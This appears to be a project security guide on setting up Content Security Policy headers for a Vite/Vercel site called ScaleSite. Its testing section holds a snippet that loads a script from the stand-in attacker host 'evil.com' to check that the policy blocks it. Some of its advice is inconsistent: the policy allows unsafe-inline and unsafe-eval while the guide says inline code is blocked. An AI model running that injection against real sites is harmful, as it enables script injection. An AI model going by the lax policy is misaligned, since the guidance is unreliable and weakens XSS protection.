# Content Security Policy (CSP) Implementation Guide

## OWASP A05:2021 - Security Misconfiguration

### What is CSP?
Content Security Policy (CSP) is an added layer of security that helps to detect and mitigate certain types of attacks, including Cross-Site Scripting (XSS) and data injection attacks.

### Implementation for ScaleSite

#### Option 1: Vite Plugin (Recommended for Development)

Install the CSP plugin:
```bash
npm install --save-dev vite-plugin-csp
```

Add to `vite.config.ts`:
```typescript
import { csp } from 'vite-plugin-csp';

export default defineConfig({
  plugins: [
    csp({
      policy: {
        'default-src': ["'self'"],
        'script-src': ["'self'", "'unsafe-inline'", "'unsafe-eval'", "https://cdn.tailwindcss.com"],
        'style-src': ["'self'", "'unsafe-inline'"],
        'img-src': ["'self'", "data:", "https:", "blob:"],
        'font-src': ["'self'", "data:"],
        'connect-src': ["'self'", "https://*.supabase.co", "wss://*.supabase.co"],
        'frame-src': ["'none'"],
        'object-src': ["'none'"],
        'base-uri': ["'self'"],
        'form-action': ["'self'"],
        'frame-ancestors': ["'none'"],
        'upgrade-insecure-requests': [],
      }
    })
  ]
});
```

#### Option 2: Meta Tag (Immediate Implementation)

Add to `index.html`:
```html
<meta http-equiv="Content-Security-Policy" content="
  default-src 'self';
  script-src 'self' 'unsafe-inline' 'unsafe-eval' https://cdn.tailwindcss.com;
  style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
  img-src 'self' data: https: blob:;
  font-src 'self' data: https://fonts.gstatic.com;
  connect-src 'self' https://*.supabase.co wss://*.supabase.co;
  frame-src 'none';
  object-src 'none';
  base-uri 'self';
  form-action 'self';
  frame-ancestors 'none';
  upgrade-insecure-requests;
">
```

#### Option 3: Server-Side (Production)

For Vercel deployment, add to `vercel.json`:
```json
{
  "headers": [
    {
      "source": "/(.*)",
      "headers": [
        {
          "key": "Content-Security-Policy",
          "value": "default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval' https://cdn.tailwindcss.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; img-src 'self' data: https: blob:; font-src 'self' data: https://fonts.gstatic.com; connect-src 'self' https://*.supabase.co wss://*.supabase.co; frame-src 'none'; object-src 'none'; base-uri 'self'; form-action 'self'; frame-ancestors 'none'; upgrade-insecure-requests;"
        },
        {
          "key": "X-Content-Type-Options",
          "value": "nosniff"
        },
        {
          "key": "X-Frame-Options",
          "value": "DENY"
        },
        {
          "key": "X-XSS-Protection",
          "value": "1; mode=block"
        },
        {
          "key": "Referrer-Policy",
          "value": "strict-origin-when-cross-origin"
        },
        {
          "key": "Permissions-Policy",
          "value": "camera=(), microphone=(), geolocation=()"
        }
      ]
    }
  ]
}
```

### CSP Directives Explained

| Directive | Value | Purpose |
|-----------|-------|---------|
| `default-src` | `'self'` | Only allow resources from same origin by default |
| `script-src` | `'self'`, `'unsafe-inline'`, `'unsafe-eval'`, `https://cdn.tailwindcss.com` | Allow inline scripts and Tailwind CDN |
| `style-src` | `'self'`, `'unsafe-inline'`, `https://fonts.googleapis.com` | Allow inline styles and Google Fonts |
| `img-src` | `'self'`, `data:`, `https:`, `blob:` | Allow images from any HTTPS source |
| `font-src` | `'self'`, `data:`, `https://fonts.gstatic.com` | Allow Google Fonts |
| `connect-src` | `'self'`, `https://*.supabase.co`, `wss://*.supabase.co` | Allow Supabase API connections |
| `frame-src` | `'none'` | Block all iframes (prevent clickjacking) |
| `object-src` | `'none'` | Block plugins (Flash, Java, etc.) |
| `base-uri` | `'self'` | Restrict `<base>` tag URLs |
| `form-action` | `'self'` | Restrict form submissions |
| `frame-ancestors` | `'none'` | Prevent page from being embedded in iframe |
| `upgrade-insecure-requests` | - | Auto-upgrade HTTP to HTTPS |

### Testing CSP

1. **Browser Console:**
   - Open DevTools → Console
   - Look for CSP violations
   - Format: `[Report Only] Refused to load...`

2. **Online Tool:**
   - https://securityheaders.com/
   - Enter your URL
   - Check CSP rating

3. **Manual Testing:**
   ```javascript
   // Try to inject script (should be blocked)
   const script = document.createElement('script');
   script.src = 'https://evil.com/xss.js';
   document.head.appendChild(script);
   ```

### Additional Security Headers

```http
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
X-XSS-Protection: 1; mode=block
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: camera=(), microphone=(), geolocation=()
Strict-Transport-Security: max-age=31536000; includeSubDomains
```

### Monitoring CSP Violations

Add CSP report-uri:
```html
<meta http-equiv="Content-Security-Policy"
      content="...; report-uri https://your-csp-report-endpoint.com/csp-report">
```

Or use report-to (modern):
```html
<meta http-equiv="Content-Security-Policy"
      content="...; report-to csp-endpoint">

<script>
  // Register reporting endpoint
  if ('ReportingObserver' in window) {
    const observer = new ReportingObserver((reports) => {
      for (const report of reports) {
        console.log('[CSP Violation]', report);
        // Send to your logging service
      }
    });
    observer.observe();
  }
</script>
```

### Gradual Implementation Strategy

**Phase 1: Report-Only Mode**
```html
<meta http-equiv="Content-Security-Policy-Report-Only"
      content="default-src 'self'; ...">
```

**Phase 2: Monitor Violations**
- Collect reports for 1-2 weeks
- Fix any false positives
- Adjust policy as needed

**Phase 3: Enforce Mode**
```html
<meta http-equiv="Content-Security-Policy"
      content="default-src 'self'; ...">
```

### Common Issues and Solutions

**Issue: Inline event handlers blocked**
```html
<!-- ❌ Blocked -->
<button onclick="doSomething()">Click</button>

<!-- ✅ Allowed -->
<button id="myButton">Click</button>
<script>
  document.getElementById('myButton').addEventListener('click', doSomething);
</script>
```

**Issue: Inline styles blocked**
```html
<!-- ❌ Blocked -->
<div style="color: red;">Text</div>

<!-- ✅ Allowed -->
<div className="text-red-500">Text</div>
```

**Issue: External fonts blocked**
- Add `https://fonts.gstatic.com` to `font-src`
- Add `https://fonts.googleapis.com` to `style-src`

### Conclusion

Implementing CSP is CRITICAL for production deployment. Start with Report-Only mode, monitor violations, and gradually move to Enforce mode.

**Priority:** 🔴 **CRITICAL** (Must implement before production launch)
